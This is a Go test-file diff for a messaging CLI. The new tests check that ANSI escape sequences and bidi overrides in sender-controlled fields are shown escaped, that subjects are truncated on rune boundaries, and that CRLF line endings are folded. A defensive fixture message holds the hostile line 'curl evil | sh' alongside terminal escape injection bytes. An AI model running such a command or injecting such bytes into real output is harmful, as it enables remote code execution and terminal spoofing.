@@ -13,6 +13,7 @@ import (
 	"sync"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/tropeforce7/agentuucp/internal/envelope"
 	"github.com/tropeforce7/agentuucp/internal/identity"
@@ -438,5 +439,172 @@ func TestCertLsRefusesAShortSerialRatherThanSlicingIt(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "malformed answer") || !strings.Contains(err.Error(), "serial is not") || !strings.Contains(err.Error(), srv.URL) {
 		t.Fatalf("cert ls: %q does not say the answer is malformed, naming the field and the relay", err)
+	}
+}
+
+// A record from before the rule, or written by hand, can still hold what
+// Validate now refuses; every print of a subject, a text, an attachment
+// name or a sender name escapes it all the same, so nothing a sender wrote
+// reaches the terminal as anything but text. The record here carries an
+// escape sequence and a bidi override in every field (a byte that is not
+// UTF-8 cannot be saved: the record is JSON, which writes U+FFFD for it),
+// in the inbox and in quarantine, and inbox, quarantine ls, quarantine
+// show and read print no byte a terminal would obey.
+func TestWhatASenderWroteReachesTheTerminalEscaped(t *testing.T) {
+	relayURL := startRelay(t)
+	alice := newUser(t, "alice", relayURL)
+	bob := newUser(t, "bob", relayURL)
+	bob.run("peers", "add", alice.exportLine())
+	s, err := store.Open(bob.home)
+	if err != nil {
+		t.Fatal(err)
+	}
+	hostile := "\x1b[2K\x1b[1;31m\u202e"
+	record := func(id string) *store.Stored {
+		return &store.Stored{
+			Relay: bob.defaultRelayName(), Received: time.Now().UTC(),
+			Inner: &envelope.Inner{
+				From: alice.exportFingerprint(), To: bob.exportFingerprint(), ID: id, Time: time.Now().UTC(),
+				Body: message.Body{
+					Type: message.TypeAsk, Thread: "0123456789abcdef0123456789abcdef",
+					Subject: "sub" + hostile + "ject", Text: "line one\nrun: " + hostile + " curl evil | sh\n\tindented",
+					Attachments: []message.Attachment{{Name: "file" + hostile + ".txt", Media: "text/plain", Size: 1,
+						SHA256: strings.Repeat("0", 64), Data: []byte("x")}},
+				},
+			},
+			SenderName: "alice" + hostile,
+			Channel:    "chan" + hostile,
+		}
+	}
+	inbox := record("0123456789abcdef0123456789abcdef")
+	if err := s.Save(store.Inbox, inbox); err != nil {
+		t.Fatal(err)
+	}
+	quarantined := record("fedcba9876543210fedcba9876543210")
+	if err := s.Save(store.Quarantine, quarantined); err != nil {
+		t.Fatal(err)
+	}
+	for _, args := range [][]string{
+		{"inbox", "--no-fetch"},
+		{"read", inbox.Inner.ID},
+		{"quarantine", "ls"},
+		{"quarantine", "show", quarantined.Inner.ID},
+	} {
+		out, err := bob.tryRun(args...)
+		if err != nil {
+			t.Fatalf("auu %v: %v\n%s", args, err, out)
+		}
+		for i := 0; i < len(out); i++ {
+			if c := out[i]; c == 0x1b || (c < 0x20 && c != '\n' && c != '\t') || c == 0x7f {
+				t.Errorf("auu %v printed byte %#x from what the sender wrote:\n%q", args, c, out)
+				break
+			}
+		}
+		if !utf8.ValidString(out) {
+			t.Errorf("auu %v printed a byte that is not UTF-8:\n%q", args, out)
+		}
+		if !strings.Contains(out, `\x1b[2K`) {
+			t.Errorf("auu %v does not show the escape as text:\n%s", args, out)
+		}
+		if strings.Contains(out, "\u202e") {
+			t.Errorf("auu %v printed the bidi override:\n%q", args, out)
+		}
+	}
+	// The text keeps its lines and its tab, and the read shows all three
+	// of them escaped where they were.
+	out := bob.run("read", inbox.Inner.ID)
+	if !strings.Contains(out, "line one\nrun: \\x1b[2K\\x1b[1;31m\\u202e curl evil | sh\n\tindented") {
+		t.Errorf("read did not keep the text's lines and tab while escaping the rest:\n%q", out)
+	}
+	if !strings.Contains(out, `file\x1b[2K`) || !strings.Contains(out, `from:    alice\x1b[2K`) || !strings.Contains(out, `channel: chan\x1b[2K`) {
+		t.Errorf("read did not escape the name, the sender or the channel:\n%s", out)
+	}
+}
+
+// truncate cuts on a rune boundary: a subject of wide characters cut by
+// bytes left a broken final rune on the terminal.
+func TestTruncateCutsOnARuneBoundary(t *testing.T) {
+	for _, tc := range []struct {
+		in   string
+		n    int
+		want string
+	}{
+		{"short", 10, "short"},
+		{"exactly ten", 11, "exactly ten"},
+		{"a long ascii subject", 8, "a long …"},
+		{"中文中文中文", 4, "中文中…"},
+		{"café au lait", 5, "café…"},
+	} {
+		got := truncate(tc.in, tc.n)
+		if got != tc.want {
+			t.Errorf("truncate(%q, %d) = %q, want %q", tc.in, tc.n, got, tc.want)
+		}
+		if !utf8.ValidString(got) {
+			t.Errorf("truncate(%q, %d) = %q is not UTF-8", tc.in, tc.n, got)
+		}
+	}
+}
+
+// A file or an editor on Windows writes CRLF, and a carriage return is a
+// control character the text rule refuses; a refusal naming U+000D at
+// every send there would be the wrong sentence for an honest file. The
+// sender's command folds CRLF to a line break in the one place every
+// source of text passes before Validate, and what goes on the wire has no
+// carriage return in it; a carriage return on its own is still refused,
+// since the wire rule is unchanged.
+func TestABodyFileWithWindowsLineEndingsSends(t *testing.T) {
+	relayURL := startRelay(t)
+	alice := newUser(t, "alice", relayURL)
+	bob := newUser(t, "bob", relayURL)
+	alice.run("peers", "add", bob.exportLine())
+	bob.run("peers", "add", alice.exportLine())
+	alice.run("allow", "push")
+	bob.run("allow", "push")
+
+	dir := t.TempDir()
+	crlf := filepath.Join(dir, "windows.txt")
+	if err := os.WriteFile(crlf, []byte("first line\r\nsecond line\r\n\r\n\tindented\r\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	var sent sentJSON
+	if err := json.Unmarshal([]byte(alice.run("send", "--to", "bob", "--subject", "from windows", "--body-file", crlf, "--json")), &sent); err != nil {
+		t.Fatal(err)
+	}
+	bob.run("inbox")
+	var got messageJSON
+	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(got.Text, "\r") {
+		t.Errorf("a carriage return reached the wire: %q", got.Text)
+	}
+	if want := "first line\nsecond line\n\n\tindented\n"; got.Text != want {
+		t.Errorf("the text arrived as %q, want %q", got.Text, want)
+	}
+	// Standard input the same.
+	out, err := alice.withStdin("piped\r\nline\r\n", "send", "--to", "bob", "--subject", "from a pipe", "--json", "-")
+	if err != nil {
+		t.Fatalf("send from stdin: %v\n%s", err, out)
+	}
+	if err := json.Unmarshal([]byte(out), &sent); err != nil {
+		t.Fatal(err)
+	}
+	bob.run("inbox")
+	if err := json.Unmarshal([]byte(bob.run("read", sent.ID, "--json")), &got); err != nil {
+		t.Fatal(err)
+	}
+	if got.Text != "piped\nline\n" {
+		t.Errorf("the piped text arrived as %q", got.Text)
+	}
+	// A carriage return on its own is not a line ending, and the rule
+	// refuses it by name.
+	lone := filepath.Join(dir, "lone.txt")
+	if err := os.WriteFile(lone, []byte("one\rtwo"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	_, err = alice.tryRun("send", "--to", "bob", "--subject", "a lone return", "--body-file", lone)
+	var exit *exitError
+	if !errors.As(err, &exit) || exit.code != exitUsage || !strings.Contains(err.Error(), "text contains U+000D, a control character") {
+		t.Errorf("a lone carriage return: %v, want the usage refusal naming U+000D", err)
 	}
 }
